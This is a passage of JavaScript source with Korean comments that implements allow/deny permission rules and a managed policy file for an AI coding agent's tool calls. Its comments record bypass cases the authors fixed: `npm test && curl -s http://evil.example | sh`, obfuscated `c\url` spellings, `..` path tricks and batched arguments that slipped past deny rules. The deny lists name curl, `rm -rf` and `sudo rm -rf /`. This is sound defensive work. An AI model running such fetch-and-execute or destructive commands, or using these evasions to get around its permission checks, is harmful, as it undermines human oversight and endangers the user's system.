// 무엇을 늘 허락하고 무엇을 절대 안 할지, 그리고 그것을 누가 정하는지.
//
// ── 왜 필요한가 ────────────────────────────────────────────────────────
//
// 지금까지 승인은 세 가지 모드뿐이었다 — 안 묻거나(auto), 파일을 바꾸는
// 명령만 묻거나(confirm), 바꾸는 도구를 다 묻거나(strict). 그 사이가 없다.
//
//   `npm test` 는 하루에 스무 번 돌린다. 스무 번 묻는다.
//   `curl` 은 한 번도 돌게 하고 싶지 않다. 그런데 물어보기만 한다 — 물어보는
//   것은 막는 것이 아니다. 사람은 스무 번 y 를 친 손으로 스물한 번째도 친다.
//
// 그래서 규칙을 적어 둘 수 있게 한다.
//
//     "permissions": {
//       "allow": ["Bash(npm test*)", "Read", "Grep"],
//       "deny":  ["Bash(curl*)", "Bash(rm -rf*)", "WebFetch"]
//     }
//
// ── 그리고 그것을 누가 정하는가 ────────────────────────────────────────
//
// 설정 파일은 **쓰는 사람의 것**이다. 지우고 고칠 수 있다. 그래서 회사가
// "이번 배포 동안은 이 게이트웨이만" 이라고 정해야 할 때 쓸 자리가 아니다.
// 그 자리가 관리 정책 파일이다 — 사용자가 못 고치는 곳에 둔다.
//
//     %ProgramData%\deel\policy.json   /etc/deel/policy.json   $DEEL_POLICY
//
// 정책은 설정을 **이긴다.** 그리고 정책은 넓히지 못한다 — 금지를 더할 수는
// 있어도 사용자가 적어 둔 금지를 풀어 주지는 못한다. 관리자가 실수로,
// 또는 누가 정책 파일을 바꿔치기해서 안전장치가 헐거워지는 길을 안 낸다.
//
// ── 순서 ───────────────────────────────────────────────────────────────
//
//   금지 > 허락 > 모드
//
// 금지가 제일 세다. 허락과 금지에 같이 걸리면 금지다. 둘 다 아니면 예전처럼
// 모드가 정한다. 그리고 무엇 때문에 막혔는지 **어디에 적힌 규칙인지까지**
// 화면에 말한다 — 그 말이 없으면 사람은 제 설정을 고칠 수도, 관리자에게
// 무엇을 풀어 달라고 할 수도 없다.
import { readFileSync, existsSync } from 'node:fs';
import { join, posix, relative, isAbsolute } from 'node:path';
import { BOM떼기 } from './trust.js';

/*
 * 관리 정책 파일을 찾을 자리들. 앞에서부터 처음 있는 것 하나만 쓴다.
 *
 * **OS 자리가 먼저다.** DEEL_POLICY 가 맨 앞이었을 때는 관리자가 정책을 둔 PC 에서도 사용자가
 * `DEEL_POLICY=빈.json` 한 줄로 정책을 통째로 갈아 끼웠다 — 「사용자가 못 고치는 곳」 이 환경변수
 * 하나로 열렸다(2.0.0 6회차 · Gemini 규칙6). DEEL_POLICY 는 OS 자리에 파일이 없을 때만 읽는 시험용이다.
 */
export function 정책자리(env = process.env, platform = process.platform) {
  const 것들 = [];
  if (platform === 'win32') {
    것들.push(join(env.ProgramData || 'C:\\ProgramData', 'deel', 'policy.json'));
  } else {
    것들.push('/etc/deel/policy.json');
  }
  if (env.DEEL_POLICY) 것들.push(env.DEEL_POLICY);
  return 것들;
}

let 읽은정책 = null;      // { 값, 곳 } — 한 번 읽고 이 프로세스 동안 안 다시 읽는다

/*
 * 관리 정책을 읽는다.
 *
 * 못 읽거나 망가져 있으면 **없는 것으로 친다.** 여기서 프로그램을 멈추면
 * 정책 파일 하나가 깨진 것으로 그 PC 의 deel 이 통째로 안 뜬다. 대신 왜
 * 못 읽었는지를 들고 있다가 화면에 적는다 — 조용히 무시하면 관리자는
 * 정책이 걸린 줄 알고, 사용자는 안 걸린 채로 쓴다.
 */
export function 정책읽기({ env = process.env, platform = process.platform, 다시 = false } = {}) {
  if (읽은정책 && !다시) return 읽은정책;
  for (const 곳 of 정책자리(env, platform)) {
    if (!existsSync(곳)) continue;
    try {
      // 윈도우 파워셸 5.1 의 `Set-Content -Encoding UTF8` 은 BOM 을 붙인다. 떼지 않으면 JSON.parse 가
      // 넘어져 「못 읽음」 으로 떨어지고 관리자 금지가 통째로 빠졌다(2.0.0 3회차).
      const 값 = JSON.parse(BOM떼기(readFileSync(곳, 'utf8')));
      읽은정책 = { 값: 값 && typeof 값 === 'object' ? 값 : {}, 곳, 탈: null };
      return 읽은정책;
    } catch (err) {
      읽은정책 = { 값: {}, 곳, 탈: `정책 파일을 못 읽었습니다 (${err.message})` };
      return 읽은정책;
    }
  }
  읽은정책 = { 값: {}, 곳: null, 탈: null };
  return 읽은정책;
}

/** 검사가 원래대로 돌려놓을 때. */
export function 정책잊기() { 읽은정책 = null; }

/*
 * `Tool(무늬)` 를 읽는다.
 *
 *   Bash            — Bash 는 전부
 *   Bash(npm test*) — 명령이 `npm test` 로 시작하는 것
 *   Bash(*rm -rf*)  — 어디에 있든 그 글자가 든 것
 *   Read(src/**)    — 경로 무늬
 *
 * 무늬가 없으면 그 도구 전체다. 별표만 특별하고 나머지는 글자 그대로다 —
 * 정규식을 받으면 적는 사람이 실수하기 쉽고, 실수한 금지 규칙은 안 걸린다.
 */
export function 규칙읽기(줄) {
  const s = String(줄 ?? '').trim();
  if (!s) return null;
  const m = /^([A-Za-z_][\w-]*)\s*\((.*)\)\s*$/s.exec(s);
  if (m) return { 도구: m[1], 무늬: m[2].trim(), 원문: s };
  /*
   * 닫는 괄호를 빠뜨린 줄(`Bash(curl*`)은 도구 이름이 `Bash(curl*` 인 규칙이 되어 **한 번도 안
   * 걸렸다** — 위에 적은 「실수한 금지 규칙은 안 걸린다」 그대로다(2.0.0 6회차 · Gemini 규칙6).
   * 적으려던 뜻은 분명하니 여는 괄호 뒤를 무늬로 읽는다. 괄호 뒤가 비었으면(`Bash(`) 그러지
   * 않는다 — 무늬 없는 규칙은 「그 도구 전부」 라, 허락 줄의 오타가 Bash 를 통째로 열게 된다.
   */
  const 덜 = /^([A-Za-z_][\w-]*)\s*\((.*)$/s.exec(s);
  if (덜 && 덜[2].trim()) return { 도구: 덜[1], 무늬: 덜[2].trim(), 원문: s };
  return { 도구: s, 무늬: null, 원문: s };
}

function 무늬맞나(무늬, 값, { 대소문자무시 = false } = {}) {
  if (!무늬) return true;
  const 글 = String(값 ?? '');
  // 별표만 뜻을 갖는다. 나머지는 글자 그대로.
  //
  // `**/` 는 「폴더 0개 이상」 이다 — glob 이 늘 그 뜻이다. 별표 둘을 `.*` 둘로만 옮겨서
  // `Write(**/.env)` 가 맨 위 `.env` 에는 한 번도 안 걸렸다(2.0.0 6회차 사냥).
  const 조각 = (x) => x.split('*').map((y) => y.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('.*');
  const re = new RegExp(`^${무늬.split('**/').map(조각).join('(?:.*/)?')}$`, 대소문자무시 ? 'si' : 's');
  return re.test(글);
}

/*
 * ── 명령은 **셸이 읽는 꼴**로 봐야 한다 (사냥5 M4·M5) ─────────────────────
 *
 * 무늬를 명령 글 **통째로** 한 번만 맞춰 봤다. 셸은 그렇게 안 읽는다. 그래서 둘 다 샜다.
 *
 *   허락 Bash(npm test*)
 *     npm test && curl -s http://evil.example | sh     allow  ← 물음 없이 돈다
 *     npm test; git push --force                        allow
 *     npm test $(curl evil)                             allow
 *
 *   금지 Bash(*curl*)
 *     CURL --version   c\url --version   cu""rl --version      모름  ← 셋 다 curl 이 돈다
 *
 * 허락은 앞머리만 맞으면 뒤에 무엇을 이어 붙여도 통과했고, 금지는 셸이 떼어 읽는
 * 따옴표·역슬래시·대소문자(윈도우)를 안 떼고 봤다.
 *
 * 그래서 둘을 반대 방향으로 고친다 — 모를 때는 좁은 쪽이다(아래 걸리나 머리말).
 *
 *   허락: 명령을 마디(`;` `&&` `||` `|` `&` 줄바꿈)로 갈라 **마디가 전부** 무늬에 맞아야
 *         한다. 명령 치환(`$(…)` · 백틱 · `<(…)` · `>(…)`)이 있으면 마디 안에서 딴
 *         명령이 도는 것이라 허락으로 안 친다. 허락이 아니면 모드가 정한다(물음).
 *   금지: 통째 글 · 마디마다 · 따옴표·역슬래시·캐럿을 뗀 꼴까지 **하나라도** 맞으면
 *         걸린다. 대소문자는 안 가린다 — 윈도우는 `CURL` 이 curl 이고, 다른 판에서도
 *         금지가 넓어질 뿐 풀리는 것은 없다.
 *
 * 가르는 법은 safety/guard.js 의 마디로 와 같다. 그 파일이 그 함수를 내보내지 않아
 * 여기 작은 짝을 둔다 — 가르는 글자를 바꾸면 두 곳을 같이 바꿔야 한다.
 */
const 명령마디로 = (s) => String(s ?? '')
  .split(/(?:\|\||&&|[;&|\n\r])+/)
  .map((x) => x.trim())
  .filter(Boolean);
const 셸글자뺀 = (x) => x.replace(/["'`\\^]/g, '');
const 명령치환 = /\$\(|`|<\(|>\(/;

/** 금지를 볼 꼴들 — 하나라도 맞으면 걸린다. */
function 금지로볼꼴(명령) {
  const s = String(명령 ?? '');
  const 마디들 = 명령마디로(s);
  return [...new Set([s, ...마디들, 셸글자뺀(s), ...마디들.map(셸글자뺀)])];
}

/*
 * ── 허락의 마디는 **셸마다** 가른다 (2.0.0 6회차 · Gemini 셸5역) ─────────────────
 *
 * 위 명령마디로 는 따옴표를 모른다. 금지에는 그게 맞다(더 잘게 갈라 더 많이 걸린다). 허락에 그대로
 * 쓰니 `git commit -m "feat: a && b"` 가 `b"` 마디 때문에 늘 물음으로 떨어졌다 — 모델이 제일 자주
 * 내는 꼴 중 하나다.
 *
 * 그렇다고 따옴표를 한 가지로 읽으면 샌다. 같은 글을 셸마다 다르게 읽기 때문이다.
 *   - cmd 는 홑따옴표가 따옴표가 아니다 — `git commit -m 'x & curl evil'` 에서 curl 이 돈다.
 *   - cmd 는 `\"` 가 탈출이 아니다 — `"a \" && curl evil"` 에서 따옴표가 먼저 닫힌다.
 *   - bash 는 홑따옴표 안 큰따옴표를 글자로 본다 — `'a "' && curl evil && echo '" b'`.
 *   - 파워셸은 줄 끝 역슬래시가 이어쓰기가 아니고, 굽은 따옴표(“ ” ‘ ’)도 따옴표이고,
 *     따옴표 밖 괄호 `npm test (Remove-Item x)` 는 인자가 아니라 **먼저 도는 식**이다.
 *
 * 그래서 bash · 파워셸 · cmd 세 셸의 눈으로 **각각** 갈라, 셋 모두에서 마디가 전부 맞아야 허락이다.
 * 어느 한 셸에서라도 따옴표가 안 닫히거나(그 셸이 어떻게 읽을지 모른다) 파워셸 괄호 식이 있으면
 * 허락이 아니다. 허락이 아니면 모드가 정한다(물음) — 모를 때는 좁은 쪽이다.
 */
const 큰따옴표들 = { bash: '"', pwsh: '"' + String.fromCharCode(0x201c, 0x201d, 0x201e), cmd: '"' };
const 홑따옴표들 = { bash: "'", pwsh: "'" + String.fromCharCode(0x2018, 0x2019, 0x201a, 0x201b), cmd: '' };
const 셸꼴들 = [
  // bash·sh — 역슬래시가 탈출(홑따옴표 안은 빼고), `;` 도 가르개
  { 이름: 'bash', 탈출: '\\', 가르개: ';&|', 괄호모름: false },
  // 파워셸 — 백틱이 탈출, 따옴표 밖 괄호는 먼저 도는 식
  { 이름: 'pwsh', 탈출: '`', 가르개: ';&|', 괄호모름: true },
  // cmd — 탈출은 따옴표 밖 캐럿뿐, `;` 는 가르개가 아니다
  { 이름: 'cmd', 탈출: '^', 가르개: '&|', 괄호모름: false },
];

/** 한 셸의 눈으로 마디를 가른다. 그 셸이 어떻게 읽을지 모르면 null. */
function 셸마디로(s, 꼴) {
  const 글 = String(s ?? '');
  const 큰 = 큰따옴표들[꼴.이름];
  const 홑 = 홑따옴표들[꼴.이름];
  const 마디들 = [];
  let 지금 = '';
  let 연 = null;   // 열린 따옴표 무리 — 큰 또는 홑
  for (let i = 0; i < 글.length; i++) {
    const ch = 글[i];
    if (연) {
      // 큰따옴표 안에서는 bash 역슬래시·파워셸 백틱이 다음 글자를 글자로 만든다. cmd 는 아니다.
      if (연 === 큰 && 꼴.이름 !== 'cmd' && ch === 꼴.탈출 && i + 1 < 글.length) { 지금 += ch + 글[++i]; continue; }
      if (연.includes(ch)) 연 = null;
      지금 += ch;
      continue;
    }
    const 다음 = 글[i + 1];
    if (ch === 꼴.탈출 && 다음 !== undefined && 다음 !== '\n' && 다음 !== '\r') { 지금 += ch + 다음; i++; continue; }
    if (큰.includes(ch)) { 연 = 큰; 지금 += ch; continue; }
    if (홑 && 홑.includes(ch)) { 연 = 홑; 지금 += ch; continue; }
    if (꼴.괄호모름 && ch === '(') return null;
    if (ch === '\n' || ch === '\r') { 마디들.push(지금); 지금 = ''; continue; }
    if (꼴.가르개.includes(ch)) {
      /*
       * `>&2` · `<&3` 처럼 뒤가 숫자면 세 셸 모두 흐름 돌리기다. `>&파일` · `&>` 를 돌리기로 읽는 것은
       * bash 뿐이다 — 다른 셸 눈에서는 가르개로 둔다(좁은 쪽). `git commit >& other-cmd` 를 한 마디로
       * 봤다가 cmd·파워셸이 뒤를 딴 명령으로 읽을 수 있었다 (2.0.0 6회차 · Gemini 허락셸6).
       */
      const 앞글 = 글[i - 1];
      const 돌리기다 = 앞글 === '>' || 앞글 === '<'
        ? (꼴.이름 === 'bash' || /\d/.test(다음 ?? ''))
        : (다음 === '>' && 꼴.이름 === 'bash');
      if (ch === '&' && 돌리기다) { 지금 += ch; continue; }
      마디들.push(지금);
      지금 = '';
      continue;
    }
    지금 += ch;
  }
  if (연) return null;
  마디들.push(지금);
  return 마디들.map((x) => x.trim()).filter(Boolean);
}

/*
 * `2>&1` · `>&2` · `&>` 는 흐름 돌리기다. 명령 쪽에서만 떼면 `Bash(npm test 2>&1)` 처럼 돌리기를
 * **적어 둔 허락**이 한 번도 안 맞는다(6회차) — 무늬도 같은 손질을 한다. 빈칸 여럿도 하나로 본다.
 */
const 돌리기뗌 = (x) => String(x ?? '').replace(/\d*[<>]&(?:\d+|-)/g, ' ').replace(/&>/g, '>');
const 빈칸하나 = (x) => x.replace(/\s+/g, ' ').trim();

/** 허락이 이 명령을 덮나 — 세 셸 모두에서 마디가 전부 맞아야 한다. */
function 허락명령맞나(무늬, 명령) {
  // 별표뿐인 무늬(`Bash(*)`)는 무늬 없는 `Bash` 와 같은 뜻이다 — 무엇이든이다.
  if (/^\*+$/.test(무늬)) return true;
  const s = String(명령 ?? '');
  if (명령치환.test(s)) return false;
  const 무늬꼴 = 빈칸하나(돌리기뗌(무늬));
  let 본마디 = false;
  for (const 꼴 of 셸꼴들) {
    const 마디들 = 셸마디로(돌리기뗌(s), 꼴);
    if (마디들 === null) return false;
    if (!마디들.length) continue;
    본마디 = true;
    if (!마디들.every((m) => 무늬맞나(무늬꼴, 빈칸하나(m)))) return false;
  }
  return 본마디 ? true : 무늬맞나(무늬, s);
}

/*
 * 도구 이름은 대소문자를 안 가린다. `bash(*curl*)` 로 적은 금지가 조용히 한 번도 안
 * 걸렸다(사냥5 M5) — 안 걸린 규칙과 없는 규칙이 화면에서 똑같이 생긴 그 자리다.
 */
const 같은도구 = (a, b) => String(a ?? '').toLowerCase() === String(b ?? '').toLowerCase();

/*
 * 이 규칙이 이 호출에 걸리나.
 *
 * 무엇을 무늬에 맞춰 보는지는 도구마다 다르다. Bash 는 명령, 파일 도구는
 * 경로다. 도구가 여러 인자를 받는 경우 **첫 번째로 뜻이 통하는 것**을 본다.
 */
/*
 * ── 인자를 **한 겹만** 보고 있었다 ──────────────────────────────────────
 *
 * 볼 자리를 `a.command`·`a.file_path`… 처럼 맨 위에서만 꺼냈다. 그런데 이
 * 저장소의 파일 도구는 **묶음 꼴을 같이 받는다** — 한 번에 여러 개를 쓰고
 * 고치라고 일부러 그렇게 지었다(tools/index.js). 그래서 같은 파일을 가리키는
 * 두 가지 적는 법이 서로 다른 답을 받았다:
 *
 *   deny: ["Write(.env)"]
 *     Write {file_path:'.env'}                 deny
 *     Write {files:[{file_path:'.env', …}]}    모름 ←  그냥 써진다
 *     Edit  {edits:[{file_path:'.env', …}]}    모름 ←
 *
 * Move 와 Skill 은 아예 **한 번도** 걸린 적이 없다. Move 는 `from`/`to` 로
 * 받고 Skill 은 `name` 으로 받는데 둘 다 목록에 없었다.
 *
 * 화면에는 `금지 3` 이라고 떠 있고, `deel rules check` 에 파일 하나짜리
 * 꼴로 물으면 `deny` 라고 답한다. 모델이 묶음 꼴로 부르면 auto 모드에서는
 * 물음 한 번 없이 지나간다. **안 걸린 규칙과 없는 규칙이 화면에서 똑같이
 * 생겼다** — 둘 다 `모름` 이다.
 *
 * 그래서 인자를 훑는다. 아는 이름의 칸만 보되, 배열이든 안쪽 객체든 따라
 * 들어간다. 깊이와 개수에 뚜껑을 씌워 이상한 인자가 와도 여기서 안 멈춘다.
 */
/*
 * 칸 이름은 적는 꼴이 제각각이다 — 우리 도구는 `file_path`, MCP 서버는 흔히 `filePath` ·
 * `source` · `destination`. 밑줄·붙임표를 떼고 소문자로 견준다. 목록에 없는 꼴로 온
 * 경로는 금지에 한 번도 안 걸렸다(2.0.0 3회차).
 */
const 볼열쇠 = new Set([
  'command', 'filepath', 'path', 'paths', 'pattern', 'glob', 'url', 'uri', 'query',
  'from', 'to', 'source', 'destination', 'name', 'dir', 'directory', 'cwd',
  'target', 'targets', 'file', 'files',
]);
// 허락을 가를 때 「무엇을 건드리나」 로 보는 칸. 아래 걸리나() 머리말.
const 경로칸 = new Set([
  'filepath', 'path', 'paths', 'from', 'to', 'source', 'destination',
  'target', 'targets', 'file', 'files', 'dir', 'directory', 'url', 'uri',
]);
const 칸이름 = (k) => String(k).replace(/[-_]/g, '').toLowerCase();

/*
 * 다 못 봤으면 **못 봤다고** 남긴다(`잘림`).
 *
 * 깊이·개수 뚜껑에 걸리면 조용히 돌아 나왔다. 그래서 인자를 200개 채운 뒤에 둔 경로나
 * 깊이 5 에 숨긴 경로는 금지를 그냥 비켰다(2.0.0 3회차). 뚜껑은 그대로 두고 — 이상한
 * 인자에 여기서 멈추면 안 된다 — 못 본 것이 있다는 표만 남긴다. 금지는 그것을 걸린 것으로,
 * 허락은 안 걸린 것으로 친다. 모를 때는 좁은 쪽이다.
 *
 * 배열은 칸 이름을 물려받는다 — `paths: [['.env']]` 의 안쪽 글도 paths 다.
 */
function 볼값모으기(값, 깊이 = 0, 담을곳 = [], 볼칸 = null) {
  if (typeof 값 === 'string') {
    if (!볼칸) return 담을곳;
    if (담을곳.length >= 200) 담을곳.잘림 = true;
    else 담을곳.push({ 칸: 볼칸, 값 });
    return 담을곳;
  }
  if (!값 || typeof 값 !== 'object') return 담을곳;
  if (깊이 > 4) {
    if (Object.keys(값).length) 담을곳.잘림 = true;
    return 담을곳;
  }
  if (Array.isArray(값)) {
    for (const x of 값) 볼값모으기(x, 깊이 + 1, 담을곳, 볼칸);
    return 담을곳;
  }
  for (const [k, v] of Object.entries(값)) {
    const 이름 = 칸이름(k);
    볼값모으기(v, 깊이 + 1, 담을곳, 볼열쇠.has(이름) ? 이름 : null);
  }
  return 담을곳;
}

/*
 * 금지는 **하나라도** 맞으면 걸리고, 허락은 **전부** 맞아야 걸린다.
 *
 * 둘 다 「하나라도」 로 봤다. 그래서 `Write(*.md)` 허락이 `.env` 가 섞인 묶음 쓰기를,
 * `Move(src/*)` 허락이 src 밖으로 옮기는 것을 물음 없이 통과시켰다(2.0.0 3회차). 허락은
 * 넓히는 규칙이라 모자란 쪽으로 틀리면 사람이 안 본 파일이 바뀐다.
 *
 * 허락이 무엇을 보나: 명령(Bash)이 있으면 명령만 — `cwd` 까지 맞으라고 하면 `Bash(npm test*)`
 * 가 쓸모없어진다. 명령이 없으면 경로 칸 전부. 그것도 없으면(Skill 이름 따위) 모은 것 전부.
 */
export function 걸리나(규칙, 도구, 인자, { 허락 = false, 뿌리 = null } = {}) {
  if (!규칙 || !같은도구(규칙.도구, 도구)) return false;
  /*
   * 괄호 안이 빈 줄(`Bash()`)은 오타다 — 규칙읽기 머리말이 `Bash(` 를 두고 적어 둔 그 자리다.
   * 무늬 없는 규칙(`Bash`)과 똑같이 「그 도구 전부」 로 태웠더니 허락 줄의 오타 한 개가 Bash 를
   * 통째로 열었다(8회차). 허락은 안 덮고, 금지는 넓은 채로 둔다 — 모를 때는 좁은 쪽이다.
   */
  if (규칙.무늬 === '') return !허락;
  if (!규칙.무늬) return true;
  const 볼것 = 볼값모으기(인자 ?? {});
  const 맞나 = (x) => 무늬맞나(규칙.무늬, x.값);
  /*
   * 경로 무늬도 **값과 같은 손질**을 한다 — `Read(./.env)` 로 적어도 `.env` 에 걸려야 하고,
   * 뿌리도 같이 넘긴다. 값만 뿌리 기준으로 펴고 무늬는 안 폈더니, 절대경로로 적어 둔 금지
   * (`Read(C:/proj/.env)`)가 절대·상대 어느 인자로 불러도 한 번도 안 걸렸다(8회차).
   */
  const 경로무늬 = 경로정리(규칙.무늬, 뿌리);
  const 윈도우 = process.platform === 'win32';
  // 명령 칸은 셸이 읽는 꼴로(위 「명령은 셸이 읽는 꼴로」), 경로 칸은 정리한 꼴로(아래 경로정리) 본다.
  const 금지맞나 = (x) => {
    if (x.칸 === 'command') return 금지로볼꼴(x.값).some((꼴) => 무늬맞나(규칙.무늬, 꼴, { 대소문자무시: true }));
    if (경로로볼칸(x.칸)) {
      return [x.값, 경로정리(x.값, 뿌리)]
        .some((꼴) => [규칙.무늬, 경로무늬].some((무) => 무늬맞나(무, 꼴, { 대소문자무시: 윈도우 })));
    }
    return 맞나(x);
  };
  if (!허락) return 볼것.잘림 === true || 볼것.some(금지맞나);
  if (볼것.잘림 || !볼것.length) return false;
  const 명령 = 볼것.filter((x) => x.칸 === 'command');
  const 경로 = 볼것.filter((x) => 경로칸.has(x.칸));
  if (명령.length) return 명령.every((x) => 허락명령맞나(규칙.무늬, x.값));
  const 볼 = 경로.length ? 경로 : 볼것;
  return 볼.every((x) => (경로로볼칸(x.칸) ? 무늬맞나(경로무늬, 경로정리(x.값, 뿌리)) : 맞나(x)));
}

/*
 * ── 경로 칸은 **정리한 꼴로** 본다 (2.0.0 6회차 사냥) ─────────────────────
 *
 * 경로 무늬를 받은 글자 그대로 맞춰 봤다. 모델은 같은 파일을 여러 꼴로 적는다 — `./.env` ·
 * `sub/../.env` · 역슬래시 · 절대경로. 그래서 둘 다 샜다.
 *
 *   금지 Read(.env)    Read ./.env · C:\proj\.env    allow  ← 금지를 비켜 읽힌다
 *   허락 Write(src/*)  Write src/../.env             allow  ← 물음 없이 .env 가 써진다
 *
 * 그래서 빗금을 `/` 로 모으고 `.`·`..`·겹빗금을 풀고, 뿌리 안의 절대경로는 뿌리 기준 상대경로로
 * 바꾼 꼴을 만든다. 금지는 날것·정리한 꼴 **하나라도** 맞으면 걸리고(윈도우는 대소문자도 안
 * 가린다), 허락은 **정리한 꼴이** 맞아야 한다 — `..` 로 무늬 밖에 나간 것을 날것 글자로 허락하면
 * 안 된다. 주소(url·uri)는 경로가 아니라 그대로 본다.
 */
function 경로정리(값, 뿌리 = null) {
  const 글 = String(값 ?? '');
  if (뿌리 && isAbsolute(글)) {
    const 상대 = relative(뿌리, 글);
    if (상대 && !상대.startsWith('..') && !isAbsolute(상대)) return 상대.split(/[\\/]+/).join('/');
  }
  const 풀린 = posix.normalize(글.replace(/\\/g, '/'));
  return 풀린 === './' ? '.' : 풀린.replace(/^\.\//, '');
}
const 주소칸 = new Set(['url', 'uri']);
const 경로로볼칸 = (칸) => 경로칸.has(칸) && !주소칸.has(칸);

function 목록(값) {
  return (Array.isArray(값) ? 값 : []).map(규칙읽기).filter(Boolean);
}

/**
 * 지금 걸려 있는 규칙 전부. 어디에 적힌 것인지를 같이 들고 다닌다.
 *
 * @returns {{allow:Array, deny:Array, 정책곳:string|null, 탈:string|null, baseUrl:string|null, offline:boolean}}
 */
export function 규칙모으기(cfg, { env = process.env, platform = process.platform } = {}) {
  const 정책 = 정책읽기({ env, platform });
  const p = 정책.값?.permissions ?? {};
  const c = cfg?.permissions ?? {};
  return {
    allow: [
      ...목록(c.allow).map((r) => ({ ...r, 출처: '설정' })),
      // 정책은 허락도 적을 수 있다 — 사내 표준 명령을 미리 풀어 두는 자리다.
      ...목록(p.allow).map((r) => ({ ...r, 출처: '관리 정책' })),
    ],
    /*
     * 금지는 **관리 정책이 먼저**다. 같은 줄이 양쪽에 있는 것은 흔하다 — 정책의 금지는
     * 설정에도 합쳐지기 때문이다(config.js 정책덮기). 설정을 먼저 보면 어떻게할까() 가
     * 먼저 걸린 쪽을 말해서 출처가 「설정」 으로 나왔고, 사람은 제 설정에서 그 줄을 지우고도
     * 계속 막혔다(8회차). 판정은 어차피 같으니 **못 고치는 쪽**을 말한다.
     */
    deny: [
      ...목록(p.deny).map((r) => ({ ...r, 출처: '관리 정책' })),
      ...목록(c.deny).map((r) => ({ ...r, 출처: '설정' })),
    ],
    정책곳: 정책.곳,
    탈: 정책.탈,
    baseUrl: typeof 정책.값?.baseUrl === 'string' ? 정책.값.baseUrl : null,
    offline: 정책.값?.offline === true,
  };
}

/**
 * 이 도구 호출을 어떻게 할까.
 *
 * @returns {{답: 'deny'|'allow'|'모름', 출처: string|null, 규칙: string|null}}
 *   deny  — 하지 않는다. 물어보지도 않는다.
 *   allow — 모드가 뭐든 안 묻고 한다.
 *   모름  — 예전대로 모드가 정한다.
 */
export function 어떻게할까(규칙들, 도구, 인자, { 뿌리 = null } = {}) {
  // 금지가 먼저다. 허락과 금지에 같이 걸리면 금지다 — 반대로 하면 규칙 하나를
  // 잘못 적어 둔 것으로 금지가 통째로 무력해진다.
  // 뿌리는 절대경로를 뿌리 기준 꼴로 바꿔 경로 규칙에 맞춰 보는 데 쓴다(위 경로정리).
  for (const r of 규칙들?.deny ?? []) {
    if (걸리나(r, 도구, 인자, { 뿌리 })) return { 답: 'deny', 출처: r.출처, 규칙: r.원문 };
  }
  for (const r of 규칙들?.allow ?? []) {
    if (걸리나(r, 도구, 인자, { 허락: true, 뿌리 })) return { 답: 'allow', 출처: r.출처, 규칙: r.원문 };
  }
  return { 답: '모름', 출처: null, 규칙: null };
}

/**
 * 늘 허락할 것에 한 줄 더한다 (ACP 의 '이건 앞으로 묻지 마세요').
 *
 * 이미 금지에 적혀 있으면 **안 더한다.** 더해 봐야 금지가 이기니 아무 일도
 * 안 일어나는데, 목록에는 허락으로 적혀 있어 사람이 풀린 줄 안다.
 * 그 어긋남이 규칙표를 못 믿게 만든다.
 */
export function 늘허락(cfg, 줄, 규칙들 = null) {
  const 규칙 = 규칙읽기(줄);
  if (!규칙) return { ok: false, 왜: '규칙이 비었습니다' };
  if (규칙들) {
    for (const d of 규칙들.deny ?? []) {
      if (!같은도구(d.도구, 규칙.도구)) continue;
      /*
       * 부딪치는지를 **글자가 똑같은지**로만 봤다. 그래서 금지가 별표로
       * 적혀 있으면(그게 흔한 꼴이다) 부딪침을 못 알아봤다:
       *
       *   deny: ["Bash(curl*)"]
       *   늘허락(cfg, "Bash(curl -s http://x)")  → ok:true 로 목록에 들어감
       *   어떻게할까(…)                          → 그래도 deny
       *
       * 에디터에서 「앞으로 묻지 않기」 를 누르면 그 줄이 permissions.allow
       * 에 적히고 규칙표에 허락 한 줄이 는다. 그런데 물음은 계속 나온다 —
       * 아니, 금지라 아예 안 된다. 이 함수 머리말이 막으려던 바로 그것이다.
       *
       * 실제로 걸리는지 보는 자(무늬맞나)에게 물어본다. 허락하려는 무늬가
       * 금지 무늬 안에 들면 부딪치는 것이다.
       */
      /*
       * 무늬 **없이** 오는 부름도 있다. ACP 의 「앞으로 묻지 않기」 는 도구 이름만 준다
       * (acp/serve.js). `Bash` 는 그 도구 전부라 `Bash(curl*)` 금지보다 넓은데, 넓은 쪽을
       * 좁은 금지에 맞춰 보느라(빈 글은 `curl*` 에 안 맞는다) 부딪침을 못 알아봤다 —
       * `allow:["Bash"]` 가 적히고 사람은 풀린 줄 아는데 curl 판정은 그대로 deny 다(8회차).
       */
      if (!d.무늬 || !규칙.무늬 || d.무늬 === 규칙.무늬 || 무늬맞나(d.무늬, 규칙.무늬)) {
        return { ok: false, 왜: `${d.출처}의 금지(${d.원문})와 부딪칩니다 — 금지가 이깁니다` };
      }
    }
  }
  cfg.permissions = cfg.permissions ?? {};
  cfg.permissions.allow = Array.isArray(cfg.permissions.allow) ? cfg.permissions.allow : [];
  if (!cfg.permissions.allow.includes(규칙.원문)) cfg.permissions.allow.push(규칙.원문);
  return { ok: true, 규칙: 규칙.원문 };
}

/*
 * ── 규칙이 진짜 그렇게 도나 ─────────────────────────────────────────────
 *
 * 규칙은 적어 두면 조용히 돈다. 그래서 **잘못 적은 규칙은 티가 안 난다.**
 *
 *     "deny": ["Bash(rm -rf*)"]
 *
 * 이건 `rm -rf /` 를 막는다. 그런데 `sudo rm -rf /` 는 안 막는다 — 무늬가
 * 앞부터 맞아야 하기 때문이다. 적은 사람은 막힌 줄 알고 지낸다. 안 막혔다는
 * 것은 진짜로 지워진 날에야 안다.
 *
 * 그래서 두 가지를 낸다.
 *
 *   1) `deel rules check "sudo rm -rf /"` — 이 명령을 어느 규칙이 어떻게
 *      정하는지 그 자리에서 말한다. 규칙을 적자마자 확인할 수 있어야 한다.
 *
 *   2) 설정에 보기를 적어 두면 그것을 돌린다. CI 에 걸 수 있는 모양이다.
 *
 *        "permissions": {
 *          "deny": ["Bash(*rm -rf*)"],
 *          "확인": [
 *            { "도구": "Bash", "값": "sudo rm -rf /tmp", "이래야": "deny" },
 *            { "도구": "Bash", "값": "npm run rf",       "이래야": "모름" }
 *          ]
 *        }
 *
 * 2번이 있어야 규칙을 **고칠 때** 안전하다. 무늬 하나를 다듬다가 다른 것이
 * 같이 풀리는 일이 실제로 흔한데, 보기를 적어 두면 그 자리에서 빨개진다.
 */

/*
 * 기대값은 한국어·영어 둘 다 받는다.
 *
 * 칸 이름은 영어로도 받으면서(tool · value · expect) 값만 한국어를 고집했다. 그래서
 * `expect:"unknown"` 으로 적은 보기가 **말없이** 버려져 확인 목록이 통째로 0개가 됐다 —
 * 검사가 아무것도 안 재면서 초록으로 남는, 이 파일이 막으려던 바로 그 모양이다(8회차).
